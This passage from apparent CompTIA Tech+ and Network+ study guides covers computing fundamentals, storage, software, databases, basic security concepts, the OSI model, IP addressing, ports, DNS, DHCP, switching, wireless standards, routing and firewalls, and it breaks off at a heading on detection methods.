- 21 ÷ 2 = 10 R 1
- 10 ÷ 2 = 5  R 0
- 5  ÷ 2 = 2  R 1
- 2  ÷ 2 = 1  R 0
- 1  ÷ 2 = 0  R 1
- **42 = 101010 in binary**

**Hex shortcuts:** 1 hex digit = 4 binary bits. FF = 11111111 = 255 decimal.

### Data Storage Units

| Unit | Bytes | Approximate |
|------|-------|-------------|
| Bit (b) | 1/8 | Single 0 or 1 |
| Byte (B) | 1 | One character |
| Kilobyte (KB) | 1,024 | Short document |
| Megabyte (MB) | 1,048,576 | MP3 song |
| Gigabyte (GB) | 1,073,741,824 | HD movie |
| Terabyte (TB) | ~1 trillion | Large HDD |
| Petabyte (PB) | ~1 quadrillion | Data center |

### CPU Architecture

- **CPU (Central Processing Unit):** Executes instructions; the "brain"
- **Cores:** Independent execution units in one chip (dual-core, quad-core, octa-core)
- **Clock Speed:** GHz = operations per second; higher = faster
- **Cache:** L1 (fastest/smallest) → L2 → L3 (largest/slowest)
- **32-bit vs 64-bit:** 64-bit can address more RAM (>4GB) and is standard today
- **x86 / x64:** Intel/AMD instruction set architectures
- **ARM:** Low-power architecture (mobile, embedded, Apple Silicon)

### Memory Types

| Type | Volatile | Speed | Use |
|------|----------|-------|-----|
| Register | Yes | Fastest | CPU calculations |
| L1/L2/L3 Cache | Yes | Very Fast | Recently used data |
| RAM (DRAM) | Yes | Fast | Active programs |
| Virtual Memory | N/A | Slow | RAM overflow (uses HDD) |
| ROM | No | Fast | Firmware/BIOS |
| Flash | No | Medium | SSDs, USB drives |
| HDD | No | Slow | Long-term storage |

**RAM Types:**
- **DDR4, DDR5:** Current standard (Double Data Rate)
- **DIMM:** Desktop RAM form factor
- **SO-DIMM:** Laptop RAM form factor
- **ECC RAM:** Error-correcting (servers)

### Input/Output Devices

**Input:** Keyboard, mouse, scanner, webcam, microphone, stylus, barcode reader, biometric reader, touchscreen  
**Output:** Monitor, printer, speaker, projector  
**Input/Output:** Touchscreen, headset, external storage

### Connectivity Types

| Interface | Speed | Use |
|-----------|-------|-----|
| USB 2.0 | 480 Mbps | Common peripherals |
| USB 3.0 (blue) | 5 Gbps | Fast storage |
| USB 3.1 | 10 Gbps | External drives |
| USB 3.2 | 20 Gbps | Fast external SSDs |
| USB4 | 40 Gbps | Thunderbolt-compatible |
| Thunderbolt 3/4 | 40 Gbps | Docking stations, 4K |
| HDMI | Video | Displays, TVs |
| DisplayPort | Video | Monitors (supports daisy-chain) |
| USB-C | Power + data + video | Universal connector |

---

## 3. Domain 2: Infrastructure

### Motherboard and Components

- **Motherboard:** Main circuit board connecting all components
- **Chipset:** Controls communication between CPU, RAM, storage
- **PCIe Slots:** Expansion cards (GPU, NIC, SSD)
- **SATA Ports:** Hard drives and optical drives
- **M.2 Slot:** NVMe SSDs (very fast, small form factor)
- **BIOS/UEFI:** Firmware that initializes hardware at startup
  - BIOS: Legacy; UEFI: Modern (supports GPT, Secure Boot, faster)
- **CMOS Battery:** Keeps BIOS settings when power is off

### Storage Technologies

| Type | Technology | Speed | Notes |
|------|-----------|-------|-------|
| HDD | Magnetic spinning disk | Slow (~100 MB/s) | High capacity, cheap |
| SSD (SATA) | Flash memory | Faster (~500 MB/s) | Replaces HDD |
| NVMe SSD | Flash via PCIe | Fastest (~3-7 GB/s) | Gaming, workstations |
| Optical | Laser (CD/DVD/Blu-ray) | Very slow | Media, archiving |
| USB Flash | NAND flash | Varies | Portable |
| SD Card | NAND flash | Varies | Cameras, mobile |

**RAID (Redundant Array of Independent Disks):**

| RAID | Min Drives | Benefit | Loss |
|------|-----------|---------|------|
| RAID 0 (Striping) | 2 | Speed | No redundancy |
| RAID 1 (Mirroring) | 2 | Redundancy | 50% capacity |
| RAID 5 | 3 | Balance | 1 drive |
| RAID 6 | 4 | More redundant | 2 drives |
| RAID 10 | 4 | Speed + redundancy | 50% capacity |

### Networking Hardware

- **Router:** Connects networks; routes packets between them; assigns IPs
- **Switch:** Connects devices within a LAN; works at Layer 2 (MAC addresses)
- **Hub:** Old/dumb; broadcasts to all ports (avoid)
- **Access Point (AP):** Wireless radio for Wi-Fi devices
- **Modem:** Converts digital ↔ analog (DSL/cable/fiber)
- **Firewall:** Controls traffic based on rules
- **NIC (Network Interface Card):** Device's network connection
- **Patch Panel:** Organized wiring distribution

### Network Types and Topologies

| Network Type | Coverage |
|-------------|---------|
| PAN | Personal (~10 feet, Bluetooth) |
| LAN | Local Area (building/campus) |
| MAN | Metropolitan Area (city) |
| WAN | Wide Area (country/world) |
| WLAN | Wireless LAN |
| VPN | Virtual Private Network (secure tunnel) |

**Topologies:**
- **Bus:** All on one cable; failure breaks network
- **Ring:** Circle; traffic flows one direction
- **Star:** All connect to central switch (most common today)
- **Mesh:** Every device connected to every other (high redundancy)
- **Hybrid:** Mix of topologies

### Cloud Computing

**Service Models:**
- **IaaS (Infrastructure as a Service):** Virtual machines, storage (AWS EC2, Azure VMs)
- **PaaS (Platform as a Service):** Development platform (Google App Engine, Heroku)
- **SaaS (Software as a Service):** Ready-to-use apps (Gmail, Salesforce, Office 365)

**Deployment Models:**
- **Public:** Shared infrastructure (AWS, Azure, GCP)
- **Private:** Dedicated to one organization
- **Hybrid:** Mix of public and private
- **Community:** Shared by several organizations with similar needs

**Cloud Benefits:**
- Scalability / Elasticity
- Pay-as-you-go (CapEx → OpEx)
- High availability
- Geographic redundancy
- No hardware maintenance

### Virtualization

- **Hypervisor:** Software that creates and manages VMs
  - **Type 1 (Bare-metal):** Runs on hardware directly (VMware ESXi, Hyper-V Server, KVM)
  - **Type 2 (Hosted):** Runs on top of OS (VMware Workstation, VirtualBox)
- **VM (Virtual Machine):** Emulates complete computer
- **Container:** Lightweight VM; shares OS kernel (Docker)
- **Snapshot:** Point-in-time copy of VM state

---

## 4. Domain 3: Applications and Software

### Operating Systems

**Functions of an OS:**
- Process management (CPU scheduling)
- Memory management (RAM allocation)
- File system management
- Device management (drivers)
- User interface (CLI or GUI)
- Security and access control

**Major OS Families:**

| OS | Kernel | GUI |
|----|--------|-----|
| Windows 11 | Windows NT | Explorer (shell) |
| macOS | XNU (Darwin) | Aqua |
| Ubuntu Linux | Linux kernel | GNOME/KDE |
| Android | Linux kernel | Custom |
| iOS | XNU | SpringBoard |
| Chrome OS | Linux kernel | Chrome |

**File Systems:**

| File System | OS | Max File Size | Notes |
|-------------|----|----|-------|
| NTFS | Windows | 16 EB | Journaling, encryption |
| FAT32 | Universal | 4 GB | Cross-platform, old |
| exFAT | Universal | 16 EB | USB drives, Flash |
| ext4 | Linux | 16 TB | Modern Linux default |
| APFS | macOS | 8 EB | SSD-optimized |
| HFS+ | macOS (old) | 8 EB | Legacy |

### Application Types

- **Native app:** Built for specific OS (Windows .exe, macOS .app)
- **Web app:** Runs in browser; cross-platform
- **Mobile app:** iOS/Android
- **Cross-platform app:** Electron, Flutter, React Native
- **Open source:** Source code publicly available (LibreOffice, Firefox)
- **Proprietary:** Commercial, closed-source (Adobe, Microsoft Office)
- **Freeware:** Free but closed-source
- **Shareware:** Try before you buy

### Software Licensing

| License Type | Key Feature |
|-------------|------------|
| Perpetual | Buy once, use forever |
| Subscription | Monthly/annual fee |
| Per-seat | Per user |
| Site license | Unlimited users at a location |
| Enterprise | Org-wide |
| Open Source (GPL) | Must share modifications |
| Open Source (MIT/Apache) | More permissive |
| Freeware | Free, no source |
| Shareware | Time/feature limited trial |
| OEM | Tied to hardware |

### File Types

**Documents:** .docx, .xlsx, .pptx, .pdf, .txt, .odt  
**Images:** .jpg/jpeg, .png, .gif, .bmp, .tiff, .svg, .webp, .raw  
**Video:** .mp4, .avi, .mkv, .mov, .wmv  
**Audio:** .mp3, .wav, .aac, .flac, .ogg  
**Archives:** .zip, .rar, .7z, .tar, .gz  
**Executables:** .exe (Windows), .dmg (macOS), .sh, .deb, .rpm (Linux)  
**Web:** .html, .css, .js, .php  
**Data:** .csv, .json, .xml, .sql  

---

## 5. Domain 4: Software Development Concepts

### Programming Paradigms

| Paradigm | Description | Languages |
|----------|-------------|-----------|
| Procedural | Step-by-step instructions | C, Pascal |
| Object-Oriented | Objects with data + behavior | Java, Python, C++ |
| Functional | Functions as values, immutable data | Haskell, Erlang, F# |
| Event-Driven | Responds to events | JavaScript |
| Declarative | Describe what, not how | SQL, HTML |

### Programming Concepts

- **Variable:** Named storage location in memory
- **Data type:** Category of data (integer, string, boolean, float)
- **Constant:** Variable that cannot change
- **Operator:** Performs operation (+, -, *, /, %, ==)
- **Control flow:** if/else, switch, loops
- **Function/Method:** Reusable block of code
- **Parameter:** Input to a function
- **Return value:** Output of a function
- **Loop:** Repeat code (for, while, do-while)
- **Array:** Ordered collection of same-type elements
- **Object:** Instance of a class with properties and methods
- **Class:** Blueprint for creating objects
- **Inheritance:** Child class extends parent class
- **Polymorphism:** Same method name, different behavior
- **Encapsulation:** Hiding implementation details

### Interpreted vs Compiled

| | Compiled | Interpreted |
|-|---------|------------|
| Examples | C, C++, Java (to bytecode) | Python, JavaScript, Ruby |
| Process | Translated to machine code before run | Translated line by line at run |
| Speed | Faster execution | Slower execution |
| Portability | Platform-specific binary | Cross-platform |
| Errors | Found at compile time | Found at runtime |

### Software Development Life Cycle (SDLC)

1. **Planning** — Define scope, feasibility, resources
2. **Analysis/Requirements** — What should the software do?
3. **Design** — Architecture, database schema, UI mockups
4. **Development/Coding** — Write the code
5. **Testing** — Find and fix bugs
6. **Deployment** — Release to production
7. **Maintenance** — Updates, patches, enhancements

**Methodologies:**
- **Waterfall:** Sequential phases; rigid; good for fixed requirements
- **Agile:** Iterative sprints; flexible; most popular today
- **Scrum:** Agile framework; sprints, daily standups, backlog
- **Kanban:** Visual board; continuous flow
- **DevOps:** Development + Operations collaboration; CI/CD

### Version Control

- **Git:** Most popular distributed version control
- **Repository (repo):** Project storage
- **Commit:** Saved snapshot of changes
- **Branch:** Independent line of development
- **Merge:** Combine branches
- **Pull request:** Request to merge changes (code review)
- **Clone:** Copy a repository locally
- **Push:** Send local commits to remote
- **Pull/Fetch:** Get remote changes locally

### Testing Types

| Type | What It Tests |
|------|--------------|
| Unit | Individual functions/methods |
| Integration | Multiple components together |
| System | Entire application |
| Acceptance (UAT) | Meets user requirements |
| Regression | New changes didn't break old functionality |
| Performance | Speed, load, stress |
| Security (Penetration) | Vulnerabilities |
| Smoke | Basic functionality after build |
| Black box | No knowledge of internals |
| White box | Full knowledge of internals |

---

## 6. Domain 5: Database Fundamentals

### Relational Databases

- **Table:** 2D structure of rows and columns
- **Row/Record:** Single data entry
- **Column/Field:** Category of data
- **Primary Key:** Unique identifier for each row
- **Foreign Key:** Links to primary key in another table
- **Index:** Speeds up queries
- **Schema:** Database structure/blueprint

**Database Relationships:**
- **One-to-One:** One customer has one profile
- **One-to-Many:** One customer has many orders
- **Many-to-Many:** Students ↔ Courses (junction table needed)

### SQL Basics

```sql
SELECT name, age FROM users WHERE age > 18 ORDER BY name;
INSERT INTO users (name, age) VALUES ('Alice', 25);
UPDATE users SET age = 26 WHERE name = 'Alice';
DELETE FROM users WHERE name = 'Alice';
```

### Non-Relational (NoSQL) Databases

| Type | Examples | Use Case |
|------|---------|---------|
| Document | MongoDB, CouchDB | JSON-like data |
| Key-Value | Redis, DynamoDB | Caching, sessions |
| Column | Cassandra, HBase | Time-series, analytics |
| Graph | Neo4j | Relationships, social networks |

**When to use NoSQL:**
- Large-scale data that doesn't fit a table
- Flexible/changing schema
- High read/write throughput
- Unstructured or semi-structured data

### Data Concepts

- **Data warehouse:** Large store for historical data analysis
- **Data lake:** Raw data store (any format)
- **Data mart:** Subset of data warehouse for specific department
- **ETL:** Extract, Transform, Load — data pipeline
- **OLTP:** Online Transaction Processing (lots of small transactions)
- **OLAP:** Online Analytical Processing (complex queries on large data)
- **Backup types:**
  - Full: Everything
  - Incremental: Changes since last backup
  - Differential: Changes since last full backup

---

## 7. Domain 6: Security

### Security Concepts

- **CIA Triad:**
  - **Confidentiality:** Only authorized users can access data
  - **Integrity:** Data is accurate and unmodified
  - **Availability:** Systems accessible when needed

- **Authentication:** Who are you? (username/password, biometrics, token)
- **Authorization:** What can you access? (permissions, roles)
- **Non-repudiation:** Cannot deny performing an action (audit logs, digital signatures)
- **Least privilege:** Give minimum access needed

### Authentication Factors

| Factor | Type | Examples |
|--------|------|---------|
| Something you know | Knowledge | Password, PIN, secret question |
| Something you have | Possession | Security key, smart card, OTP token |
| Something you are | Inherence | Fingerprint, face, retina |
| Somewhere you are | Location | GPS, IP geofencing |

**MFA/2FA:** Using two or more factors for authentication.

### Common Threats

| Threat | Description |
|--------|-------------|
| Phishing | Deceptive email to steal credentials |
| Spear phishing | Targeted phishing |
| Vishing | Voice/phone phishing |
| Smishing | SMS phishing |
| Malware | Any malicious software |
| Virus | Self-replicating malicious code (needs host file) |
| Worm | Self-replicating, spreads without host |
| Trojan | Disguises as legitimate software |
| Ransomware | Encrypts files and demands ransom |
| Spyware | Secretly monitors activity |
| Adware | Displays unwanted ads |
| Rootkit | Hides itself deep in OS |
| Keylogger | Records keystrokes |
| Botnet | Network of compromised machines |
| DDoS | Distributed Denial of Service |
| SQL Injection | Malicious SQL in input fields |
| Man-in-the-Middle | Intercept communications |
| Social Engineering | Manipulate people into revealing info |

### Encryption

- **Encryption:** Transform readable data (plaintext) into unreadable (ciphertext)
- **Decryption:** Reverse process
- **Key:** Secret value used in encryption/decryption

| Type | Keys | Examples | Use Case |
|------|------|---------|---------|
| Symmetric | Same key for encrypt/decrypt | AES, DES | Fast, bulk data |
| Asymmetric | Public/private key pair | RSA, ECC | Key exchange, signatures |
| Hashing | One-way (no decryption) | SHA-256, MD5 | Passwords, integrity |

- **HTTPS:** HTTP with TLS encryption (padlock in browser)
- **SSL/TLS:** Protocol for encrypted web communication
- **PKI:** Infrastructure for managing digital certificates
- **Digital Certificate:** Proves identity; contains public key
- **Certificate Authority (CA):** Trusted issuer of certificates
- **Digital Signature:** Proves sender identity and integrity

### Security Controls

**By Type:**
- **Technical:** Firewalls, antivirus, encryption, MFA, IDS/IPS
- **Administrative:** Policies, training, background checks, procedures
- **Physical:** Locks, cameras, guards, badge access, mantrap

**By Function:**
- **Preventive:** Stop attacks (firewall, antivirus)
- **Detective:** Find attacks (IDS, logs, SIEM)
- **Corrective:** Fix after attack (backup restoration, patch)
- **Deterrent:** Discourage attacks (warning signs, legal notices)

### Network Security

- **Firewall:** Blocks/allows traffic based on rules
- **IDS:** Intrusion Detection System — monitors and alerts
- **IPS:** Intrusion Prevention System — monitors and blocks
- **VPN:** Encrypted tunnel over public internet
- **DMZ:** Demilitarized Zone — separate network for public-facing servers
- **NAT:** Network Address Translation — hides internal IPs
- **ACL:** Access Control List — rules for who can access what

### Physical Security

- **Mantrap:** Airlock-style double doors; one opens at a time
- **Badge access:** Proximity card or smart card entry
- **Biometrics:** Fingerprint/face/iris for physical access
- **CCTV:** Closed-circuit television (cameras)
- **Cable locks:** Physically secure laptops
- **Safe/vault:** Protect critical media and hardware

### Security Best Practices

- Use strong, unique passwords (12+ characters, mixed types)
- Enable MFA on all accounts
- Keep software updated (patch regularly)
- Use antivirus/EDR software
- Encrypt sensitive data
- Use HTTPS everywhere
- Regular data backups (follow 3-2-1 rule)
- Principle of least privilege
- Security awareness training
- Incident response plan

**3-2-1 Backup Rule:**
- **3** copies of data
- **2** different storage types
- **1** offsite copy

---

## 8. Quick Review: Key Terms

| Term | Definition |
|------|-----------|
| API | Application Programming Interface — lets software talk to each other |
| CLI | Command-Line Interface |
| GUI | Graphical User Interface |
| BIOS/UEFI | Firmware that starts a computer |
| OS | Operating System |
| CPU | Central Processing Unit |
| RAM | Random Access Memory (volatile) |
| HDD/SSD | Storage drives |
| IP Address | Unique network identifier |
| MAC Address | Hardware-level network address |
| DNS | Domain Name System — translates names to IPs |
| DHCP | Auto-assigns IP addresses |
| HTTP/HTTPS | Web browsing protocols |
| FTP | File Transfer Protocol |
| SSH | Secure Shell — remote CLI access |
| VPN | Virtual Private Network |
| Firewall | Network/host traffic filter |
| Encryption | Protect data with cipher |
| Authentication | Verify identity |
| Authorization | Grant access rights |

---

*End of CompTIA Tech+ Study Guide*


---

# CompTIA Network+ (N10-009) — Complete Study Guide

---

## 1. Exam Overview

**Exam Code:** N10-009  
**Questions:** Maximum 90 (multiple-choice + performance-based)  
**Time Limit:** 90 minutes  
**Passing Score:** 720 (on a 100–900 scale)  
**Recommended Experience:** CompTIA A+ or 9-12 months networking experience

### Domain Breakdown

| Domain | Weight |
|--------|--------|
| 1. Networking Concepts | 23% |
| 2. Network Implementation | 19% |
| 3. Network Operations | 19% |
| 4. Network Security | 19% |
| 5. Network Troubleshooting | 20% |

---

## 2. The OSI Model

The OSI (Open Systems Interconnection) model has 7 layers. **Mnemonic:** "Please Do Not Throw Sausage Pizza Away" (Physical → Application).

| # | Layer | Function | Protocol/Device Examples |
|---|-------|----------|--------------------------|
| 7 | Application | End-user interface | HTTP, FTP, DNS, SMTP, SSH |
| 6 | Presentation | Encoding, encryption, compression | TLS/SSL, JPEG, MPEG |
| 5 | Session | Manage sessions | NetBIOS, RPC, SQL |
| 4 | Transport | End-to-end delivery, port numbers | TCP, UDP |
| 3 | Network | Logical addressing, routing | IP, ICMP, OSPF, BGP — Routers |
| 2 | Data Link | Physical addressing (MAC), framing | Ethernet, 802.11 — Switches |
| 1 | Physical | Bits on wire/air | Cables, hubs, repeaters |

**Data unit names by layer:**
- Layer 7/6/5: Data
- Layer 4: Segment (TCP) / Datagram (UDP)
- Layer 3: Packet
- Layer 2: Frame
- Layer 1: Bit

**Encapsulation:** As data goes down the stack, headers are added. As it goes up, headers are removed (decapsulation).

---

## 3. TCP/IP Model

| TCP/IP Layer | Corresponds to OSI |
|-------------|-------------------|
| Application | 5, 6, 7 |
| Transport | 4 |
| Internet | 3 |
| Network Access / Link | 1, 2 |

---

## 4. IP Addressing

### IPv4

- **Format:** 32-bit, written as 4 octets: `192.168.1.100`
- **Range:** Each octet 0–255
- **Total addresses:** ~4.3 billion (2³²)

### IPv4 Address Classes (Classful, mostly legacy)

| Class | First Octet | Default Mask | Use |
|-------|------------|--------------|-----|
| A | 1–126 | 255.0.0.0 /8 | Large networks |
| B | 128–191 | 255.255.0.0 /16 | Medium networks |
| C | 192–223 | 255.255.255.0 /24 | Small networks |
| D | 224–239 | N/A | Multicast |
| E | 240–255 | N/A | Experimental |

*127.x.x.x = Loopback (localhost)*

### Private IP Ranges (RFC 1918)

| Range | CIDR | Hosts |
|-------|------|-------|
| 10.0.0.0 – 10.255.255.255 | 10.0.0.0/8 | ~16 million |
| 172.16.0.0 – 172.31.255.255 | 172.16.0.0/12 | ~1 million |
| 192.168.0.0 – 192.168.255.255 | 192.168.0.0/16 | ~65,000 |

### Special IPv4 Addresses

| Address/Range | Purpose |
|--------------|---------|
| 0.0.0.0 | Unspecified / all networks |
| 127.0.0.1 | Loopback |
| 169.254.0.0/16 | APIPA (auto-assigned when DHCP fails) |
| 255.255.255.255 | Limited broadcast |
| x.x.x.255 | Directed broadcast (for that subnet) |
| x.x.x.0 | Network address (not assignable) |

### Subnetting

**CIDR Notation:** `192.168.1.0/24` — the `/24` means 24 bits are the network portion.

**Quick Subnetting Reference:**

| CIDR | Subnet Mask | Hosts | Networks from /24 |
|------|-------------|-------|------------------|
| /24 | 255.255.255.0 | 254 | 1 |
| /25 | 255.255.255.128 | 126 | 2 |
| /26 | 255.255.255.192 | 62 | 4 |
| /27 | 255.255.255.224 | 30 | 8 |
| /28 | 255.255.255.240 | 14 | 16 |
| /29 | 255.255.255.248 | 6 | 32 |
| /30 | 255.255.255.252 | 2 | 64 |

**Formula:** Hosts per subnet = 2ⁿ – 2 (n = host bits, subtract network and broadcast)

**Subnetting steps:**
1. Convert mask to binary
2. AND the IP with the mask → Network address
3. Flip all host bits to 1 → Broadcast address
4. First host = Network + 1; Last host = Broadcast – 1

### IPv6

- **Format:** 128-bit; 8 groups of 4 hex digits: `2001:0db8:85a3:0000:0000:8a2e:0370:7334`
- **Abbreviation rules:**
  - Leading zeros in a group can be dropped: `0db8` → `db8`
  - Consecutive all-zero groups replaced with `::` (only once)
  - `2001:db8::8a2e:370:7334`
- **Total:** 2¹²⁸ ≈ 340 undecillion addresses

**IPv6 Address Types:**

| Type | Prefix | Purpose |
|------|--------|---------|
| Global Unicast | 2000::/3 | Public (routable) |
| Link-Local | FE80::/10 | Local link only (auto-configured) |
| Loopback | ::1/128 | Same as 127.0.0.1 |
| Unspecified | ::/128 | Like 0.0.0.0 |
| Multicast | FF00::/8 | One-to-many |
| Unique Local | FC00::/7 | Like private IPv4 |

**Key differences from IPv4:**
- No broadcast — uses multicast
- Stateless Address Autoconfiguration (SLAAC) — no DHCP needed
- Built-in IPsec support
- No NAT (enough addresses for everyone)
- Neighbor Discovery Protocol (NDP) replaces ARP

---

## 5. Network Ports and Protocols

### Well-Known Ports (Memorize These)

| Port | Protocol | Transport | Description |
|------|----------|-----------|-------------|
| 20 | FTP-Data | TCP | FTP data transfer |
| 21 | FTP-Control | TCP | FTP commands |
| 22 | SSH | TCP | Secure remote shell |
| 23 | Telnet | TCP | Insecure remote shell |
| 25 | SMTP | TCP | Send email |
| 53 | DNS | UDP/TCP | Name resolution |
| 67/68 | DHCP | UDP | IP assignment (server/client) |
| 69 | TFTP | UDP | Trivial File Transfer |
| 80 | HTTP | TCP | Web browsing |
| 110 | POP3 | TCP | Receive email (download) |
| 119 | NNTP | TCP | News groups |
| 123 | NTP | UDP | Time synchronization |
| 143 | IMAP | TCP | Receive email (keep on server) |
| 161/162 | SNMP | UDP | Network monitoring |
| 389 | LDAP | TCP/UDP | Directory services |
| 443 | HTTPS | TCP | Secure web |
| 445 | SMB | TCP | File sharing (Windows) |
| 465 | SMTPS | TCP | Secure SMTP |
| 514 | Syslog | UDP | System logging |
| 587 | SMTP (submission) | TCP | Client to mail server |
| 636 | LDAPS | TCP | Secure LDAP |
| 993 | IMAPS | TCP | Secure IMAP |
| 995 | POP3S | TCP | Secure POP3 |
| 1433 | MS SQL Server | TCP | Microsoft SQL Server |
| 1521 | Oracle DB | TCP | Oracle database |
| 3306 | MySQL | TCP | MySQL database |
| 3389 | RDP | TCP | Remote Desktop Protocol |
| 5060/5061 | SIP | TCP/UDP | VoIP signaling |
| 5900 | VNC | TCP | Remote desktop (VNC) |
| 8080 | HTTP Alt | TCP | Alternate HTTP |
| 8443 | HTTPS Alt | TCP | Alternate HTTPS |

### TCP vs UDP

| Feature | TCP | UDP |
|---------|-----|-----|
| Connection | Connection-oriented (3-way handshake) | Connectionless |
| Reliability | Guaranteed delivery (ACK) | Best-effort |
| Order | Maintains order | No ordering |
| Speed | Slower | Faster |
| Error checking | Yes | Basic checksum |
| Use cases | HTTP, SSH, FTP, SMTP | DNS, DHCP, streaming, gaming |

**TCP 3-Way Handshake:** SYN → SYN-ACK → ACK (then data flows)  
**TCP Connection Close:** FIN → ACK → FIN → ACK (4-step)

---

## 6. DNS

- **DNS (Domain Name System):** Translates human-readable names to IP addresses
- **DNS hierarchy:** Root → TLD (.com, .org) → Domain → Subdomain

**DNS Record Types:**

| Record | Purpose | Example |
|--------|---------|---------|
| A | Hostname → IPv4 | example.com → 93.184.216.34 |
| AAAA | Hostname → IPv6 | example.com → 2606:2800::1 |
| CNAME | Alias to another name | www → example.com |
| MX | Mail server | Priority + mail.example.com |
| NS | Authoritative name server | ns1.example.com |
| PTR | Reverse DNS (IP → name) | 34.216.184.93.in-addr.arpa |
| SOA | Start of Authority | Zone metadata |
| TXT | Text record | SPF, DKIM, verification |
| SRV | Service location | _sip._tcp.example.com |

**DNS Resolution Process:**
1. Client queries local DNS cache
2. If not cached, queries local DNS server (resolver)
3. Resolver queries Root servers (.)
4. Root refers to TLD name server (.com)
5. TLD refers to authoritative name server
6. Authoritative returns IP address
7. Resolver caches and returns to client

---

## 7. DHCP

DHCP (Dynamic Host Configuration Protocol) automatically assigns IP configuration.

**DORA Process:**
1. **Discover** — Client broadcasts "I need an IP"
2. **Offer** — Server offers an IP address
3. **Request** — Client accepts the offer
4. **Acknowledge** — Server confirms the lease

**DHCP provides:** IP address, subnet mask, default gateway, DNS servers, lease time

**DHCP Relay Agent:** Forwards DHCP broadcasts across routers (since broadcasts don't cross routers normally).

---

## 8. Network Devices Deep Dive

### Router
- Operates at **Layer 3** (Network)
- Routes packets between networks using IP addresses
- Uses **routing tables** to determine best path
- Connects LAN to WAN (internet)
- NAT: translates private IPs to public

### Switch
- Operates at **Layer 2** (Data Link)
- Uses **MAC address table** to forward frames
- Each port = separate collision domain
- All ports = same broadcast domain (unless VLANs)

**Switch operations:**
- **Learning:** Records source MAC + port
- **Flooding:** Unknown destination → send to all ports
- **Forwarding:** Known destination → send to correct port
- **Filtering:** Source = destination → don't forward
- **Aging:** Remove stale MAC table entries

### Layer 3 Switch
- Combines switch + router functionality
- Routes between VLANs without a separate router

### VLANs (Virtual LANs)
- Logically segment a single switch into multiple networks
- Separate broadcast domains on same physical switch
- **Access port:** Belongs to one VLAN (end devices)
- **Trunk port:** Carries multiple VLANs (switch-to-switch, switch-to-router)
- **802.1Q tagging:** VLAN tag added to frame on trunk links

**Inter-VLAN routing:** Router-on-a-stick (one router interface per VLAN) or Layer 3 switch

### Spanning Tree Protocol (STP)
- Prevents loops in redundant switched networks
- **802.1D STP:** Root bridge election → ports become root, designated, or blocked
- **802.1w RSTP:** Rapid STP, much faster convergence
- **PVST+:** Per-VLAN STP (Cisco)
- **Port states:** Blocking → Listening → Learning → Forwarding (STP)
- Root bridge: lowest Bridge ID (priority + MAC) wins

### Access Point (AP)
- Operates at **Layer 2**
- Provides wireless connectivity
- **BSS:** Basic Service Set — one AP + its clients
- **ESS:** Extended Service Set — multiple APs, same SSID

---

## 9. Wireless Networking

### Wi-Fi Standards

| Standard | Max Speed | Frequency | Range | Notes |
|----------|-----------|-----------|-------|-------|
| 802.11a | 54 Mbps | 5 GHz | Short | Legacy |
| 802.11b | 11 Mbps | 2.4 GHz | Long | Legacy |
| 802.11g | 54 Mbps | 2.4 GHz | Medium | Legacy |
| 802.11n (Wi-Fi 4) | 600 Mbps | 2.4/5 GHz | Good | MIMO |
| 802.11ac (Wi-Fi 5) | 3.5 Gbps | 5 GHz | Good | MU-MIMO |
| 802.11ax (Wi-Fi 6) | 9.6 Gbps | 2.4/5 GHz | Good | OFDMA, WPA3 |
| 802.11be (Wi-Fi 7) | 46 Gbps | 2.4/5/6 GHz | | Multi-link |

**2.4 GHz vs 5 GHz:**
- 2.4 GHz: Longer range, more interference, 3 non-overlapping channels
- 5 GHz: Shorter range, less interference, more channels, faster speeds

**Non-overlapping 2.4 GHz channels:** 1, 6, 11

### Wireless Security

| Protocol | Security | Notes |
|----------|----------|-------|
| WEP | Very weak | Broken — don't use |
| WPA | Weak | Uses TKIP — avoid |
| WPA2 | Strong | AES/CCMP — current standard |
| WPA3 | Strongest | SAE, forward secrecy, required for Wi-Fi 6 |

**WPA2 modes:**
- **Personal (PSK):** Pre-shared key (home/small business)
- **Enterprise:** 802.1X authentication (RADIUS server)

**Common wireless attacks:**
- **Evil twin:** Fake AP mimicking legitimate one
- **Deauthentication attack:** Force clients to disconnect
- **KRACK:** Key reinstallation attack on WPA2
- **WPS brute force:** Attack WPS PIN

---

## 10. Routing

### Static vs Dynamic Routing

**Static:** Manually configured routes. Reliable but doesn't adapt to failures.  
**Dynamic:** Routes advertised automatically between routers using protocols.

### Routing Protocols

| Protocol | Type | Algorithm | Admin Distance | Metric |
|----------|------|-----------|---------------|--------|
| RIP | Distance-vector | Bellman-Ford | 120 | Hop count (max 15) |
| OSPF | Link-state | Dijkstra | 110 | Cost (bandwidth) |
| EIGRP | Hybrid | DUAL | 90 (internal) | Bandwidth + delay |
| BGP | Path-vector | Best-path | 20 (eBGP) | AS-path + attributes |
| ISIS | Link-state | Dijkstra | 115 | Cost |

**Administrative Distance:** Trustworthiness of route source (lower = more trusted)
- Connected: 0 | Static: 1 | EIGRP: 90 | OSPF: 110 | RIP: 120 | External: 170+

**OSPF concepts:**
- **Router ID:** Highest loopback IP or configured ID
- **DR/BDR:** Designated/Backup Designated Router (on multi-access networks)
- **LSA:** Link State Advertisement
- **LSDB:** Link State Database
- **SPF tree:** Shortest Path First calculation

### NAT (Network Address Translation)

- **Static NAT:** One-to-one mapping
- **Dynamic NAT:** Pool of public IPs, assigned as needed
- **PAT (Port Address Translation):** Many-to-one; uses port numbers (most common — "NAT overload")

---

## 11. WAN Technologies

| Technology | Speed | Description |
|-----------|-------|-------------|
| T1 | 1.544 Mbps | Leased line, 24 DS0 channels |
| T3 | 44.736 Mbps | 28 T1 lines |
| ADSL | Up to 8 Mbps down | Asymmetric DSL over phone line |
| VDSL | Up to 52 Mbps | Very high DSL |
| Cable | Hundreds of Mbps | DOCSIS over coax |
| Fiber (FTTH) | 1+ Gbps | Fiber to the home |
| MPLS | Varies | Label-switched, QoS-friendly |
| Metro Ethernet | 10 Mbps–10 Gbps | Ethernet over WAN |
| Satellite | 25–100 Mbps | High latency (~600ms) |
| Cellular (LTE/5G) | Varies | Mobile broadband |
| SD-WAN | Varies | Software-defined WAN |

---

## 12. Network Security

### Firewalls

| Type | Inspection | Notes |
|------|-----------|-------|
| Packet filter | Headers only | Fast, basic |
| Stateful | Connection state | Tracks sessions |
| Application-layer | Deep packet inspection | Understands app protocols |
| NGFW | Everything + IPS, SSL inspection | Modern standard |

**Firewall rule order:** Rules processed top-down; first match wins; implicit deny at end.

### IDS vs IPS

| | IDS | IPS |
|-|-----|-----|
| Placement | Out-of-band (copy of traffic) | Inline (all traffic passes through) |
| Action | Alerts only | Alerts + blocks |
| Failure mode | Network still works | Can cause downtime |
| Response time | Passive | Active |

**Detection methods:**
